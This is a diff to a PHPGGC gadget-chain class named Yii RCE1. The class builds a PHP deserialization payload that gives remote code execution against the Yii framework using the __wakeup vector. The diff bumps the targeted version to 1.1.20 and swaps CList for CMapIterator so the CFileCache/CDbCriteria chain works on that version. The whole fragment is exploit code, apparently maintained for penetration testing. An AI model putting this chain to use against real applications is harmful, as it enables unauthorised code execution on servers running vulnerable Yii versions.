@@ -4,7 +4,7 @@ namespace GadgetChain\Yii;
 
 class RCE1 extends \PHPGGC\GadgetChain\RCE
 {
-    public $version = '1.1.19';
+    public $version = '1.1.20';
     public $vector = '__wakeup';
     public $author = 'cf';
     public $informations = '
@@ -22,7 +22,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
         $parameter = base64_encode($parameter);
 
         $a = new \CFileCache($function, $parameter);
-        $b = new \CList($a);
+        $b = new \CMapIterator($a);
         $c = new \CDbCriteria($b);
 
         return $c;
